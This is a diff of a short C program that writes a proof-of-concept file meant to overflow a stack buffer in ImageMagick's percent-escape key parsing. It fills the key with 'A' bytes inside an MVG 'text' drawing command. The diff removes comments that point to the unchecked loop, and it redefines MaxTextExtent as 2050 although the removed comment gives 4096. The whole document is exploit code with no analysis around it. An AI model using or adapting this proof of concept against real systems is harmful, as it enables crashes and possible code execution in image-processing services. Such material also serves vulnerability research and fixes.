@@ -1,23 +1,22 @@
 #include <stdio.h>
 #include <stdlib.h>
-#include <string.h>
+
+#define MaxTextExtent 2050
 
 int main(void) {
     FILE *f = fopen("/tmp/poc", "wb");
     if (!f) { perror("fopen"); return 1; }
 
-    // The vulnerability is at line 6317: key[i] = (*p++);
-    // The loop writes into key[] without checking if i < MaxTextExtent
-    // when the ']' is not found. We need to write MaxTextExtent+1 bytes
-    // before the closing bracket to overflow the stack buffer.
-    // MaxTextExtent = 4096 (from Magick++/Include.h)
-    
+    fprintf(f, "push graphic-context\n");
+    fprintf(f, "text 0,0 \"");
     fputc('%', f);
     fputc('[', f);
-    for (int i = 0; i < 4097; i++) {
+    for (int i = 0; i < MaxTextExtent; i++)
         fputc('A', f);
-    }
     fputc(']', f);
+    fprintf(f, "\"\n");
+    fprintf(f, "pop graphic-context\n");
+
     fclose(f);
     return 0;
 }
